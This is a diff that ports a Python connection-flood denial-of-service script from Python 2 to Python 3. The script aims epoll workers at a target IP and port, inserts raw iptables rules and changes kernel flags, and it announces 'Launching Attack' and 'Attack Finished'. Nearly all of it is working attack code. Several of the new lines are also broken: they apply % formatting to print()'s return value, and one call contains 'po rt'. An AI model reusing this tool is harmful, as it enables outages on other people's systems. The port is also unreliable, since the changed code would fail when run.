@@ -33,7 +33,7 @@ try:
         exit(3)
 except:
     print("[+] ! Error : You Dont Have 'Platform' Module İnstalled , So We Cant Detect İf You Are Running Linux")
-    print "         This Script Will Try To Continue , But Will Only Work Under Linux"
+    print("[+] This Script Will Try To Continue , But Will Only Work Under Linux")
     pass
 
 # Check root
@@ -81,19 +81,19 @@ ipTables = [
 
 # Add target to iptables
 def addIpTables(iptables):
-    print "[+] Adding İptables For The Target..."
+    print("[+] Adding İptables For The Target...")
     for i in iptables:
         os.system("iptables -t raw -I %s 2>/dev/null" % (i))
 
 # Remove target from iptables
 def removeIpTables(iptables):
-    print "[+] Removing İptables For The Target..."
+    print("[+] Removing İptables For The Target...")
     for i in iptables:
         os.system("iptables -t raw -D %s 2>/dev/null" % (i))
 
 # Get kernel flags
 def getKernelFlags(flags):
-    print "[+] Getting Kernel Flags"
+    print("[+] Getting Kernel Flags")
     result = {}
     for flag in flags:
         try:
@@ -104,7 +104,7 @@ def getKernelFlags(flags):
 
 # Set kernel flags
 def setKernelFlags(flags):
-    print "[+] Setting Kernel Flags"
+    print("[+] Setting Kernel Flags")
     for flag,value in flags.items():
         try:
             subprocess.run(["sysctl", "-w", "%s=\"%s\"" % (flag, value)]);
@@ -113,7 +113,7 @@ def setKernelFlags(flags):
 
 # Signal handler
 def sigHandler(signum, frame):
-    print "[+] Got Signal %d!" % (signum)
+    print("[+] Got Signal %d!") % (signum)
     global ip
     global port
     global savedFlags
@@ -132,10 +132,10 @@ def add_connection(epoll, connections, ip, port):
 # Set rlimit
 try:
     import resource
-    print "[+] Setting RLimit"
+    print("[+] Setting RLimit")
     resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
 except:
-    print "[+]! Error : Error İmporting Module 'Resource' Or Setting 'Nofile' Limit , We Will Continue Anyway (The Attack May Fail)"
+    print("[+] ! Error : Error İmporting Module 'Resource' Or Setting 'Nofile' Limit , We Will Continue Anyway (The Attack May Fail)")
 
 # Set kernel flags
 savedFlags = getKernelFlags(list(kernelFlags.keys()))
@@ -144,11 +144,11 @@ setKernelFlags(flags=kernelFlags)
 # Add signal handlers
 try:
     import signal
-    print "[+] Adding Signal Handlers"
+    print("[+] Adding Signal Handlers")
     signal.signal(signal.SIGINT, sigHandler)
     signal.signal(signal.SIGTERM, sigHandler)
 except:
-    print "[+]! Error : Error İmporting Module 'Signal' Or Adding Signal Handlers , You Must Restore İptables And Kernel Flags Yourself When The Script Finishes!!!"
+    print("[+] ! Error : Error İmporting Module 'Signal' Or Adding Signal Handlers , You Must Restore İptables And Kernel Flags Yourself When The Script Finishes!!!")
 
 # Add iptables
 addIpTables(ipTables)
@@ -157,14 +157,14 @@ addIpTables(ipTables)
 def worker(host, ip, port, workerId):
     global connectionsPerWorker
 
-    print "[+] Starting Epoll Worker And Enqueuing %d Connections [id=%d]..." % (connectionsPerWorker, workerId)
+    print("[+] Starting Epoll Worker And Enqueuing %d Connections [id=%d]...") % (connectionsPerWorker, workerId)
     epoll = select.epoll()
 
     connections = {}
     for i in range(1, connectionsPerWorker):
         add_connection(epoll, connections, ip, port)
 
-    print "[+] %d Connections Added İnto Queue , Running Event Loop..." % (connectionsPerWorker)
+    print("[+] %d Connections Added İnto Queue , Running Event Loop...") % (connectionsPerWorker)
     try:
         while True:
             events = epoll.poll(-1)
@@ -179,7 +179,7 @@ def worker(host, ip, port, workerId):
                     add_connection(epoll, connections, ip, port)
 
     except Exception as e:
-        print "[+] ! Error ! %s %s At Worker [id=%d]" % (type(e).__name__, e.message, workerId)
+        print("[+] ! Error ! %s %s At Worker [id=%d]") % (type(e).__name__, e.message, workerId)
 
 # Detect cpu count to set number of threads
 numThreads = 1
@@ -187,26 +187,26 @@ try:
     import multiprocessing
     numThreads = multiprocessing.cpu_count() - 1;
 except Exception as e:
-    print "[+] ! Error Detecting CPU Core Count : %s %s / We Will Assume That You Have Single Core" % (type(e).__name__, e.message)
+    print("[+] ! Error Detecting CPU Core Count : %s %s / We Will Assume That You Have Single Core") % (type(e).__name__, e.message)
     numThreads = 1
 
 # Detect if module threading is present
 try:
     import threading
 except:
-    print "[+] ! Error İmporting Module 'Threading' , We Will Continue With Single Thread"
+    print("[+] ! Error İmporting Module 'Threading' , We Will Continue With Single Thread")
     numThreads = 1
 
 # Detect if module time is present
 try:
     import time
 except:
-    print "[+] ! Error İmporting Module 'Time' Needed For Sleeps İn Thread Check Loop , We Will Continue With Single Thread"
+    print("[+] ! Error İmporting Module 'Time' Needed For Sleeps İn Thread Check Loop , We Will Continue With Single Thread")
     numThreads = 1
 
 # If running threading mode, launch threads and wait for them
 if(numThreads > 1):
-    print "[+] Host Has More Than 2 CPU Cores , Starting %d Threads..." % (numThreads)
+    print("[+] Host Has More Than 2 CPU Cores , Starting %d Threads...") % (numThreads)
     for i in range(numThreads):
         t = threading.Thread(target=worker, args=(host, ip, port, i))
         t.daemon = True
@@ -216,16 +216,16 @@ if(numThreads > 1):
     while threads and not finish:
         for i in threads:
             if not i.is_alive():
-                print "! Some thread died"
+                print("[!] Some Thread Died")
                 finish = True
                 break
         time.sleep(1)
 else:
-    print "[+] Host Has 2 CPU Cores Or Less , Launching Attack İn Main Thread"
-    worker(host, ip, port, 0)
+    print("[+] Host Has 2 CPU Cores Or Less , Launching Attack İn Main Thread")
+    worker(host, ip, po rt, 0)
 
 # If we get here, the attack has finished or script has exited
-print "[+] Attack Finished"
+print("[+] Attack Finished")
 removeIpTables(ipTables)
 setKernelFlags(savedFlags)
 exit(0)
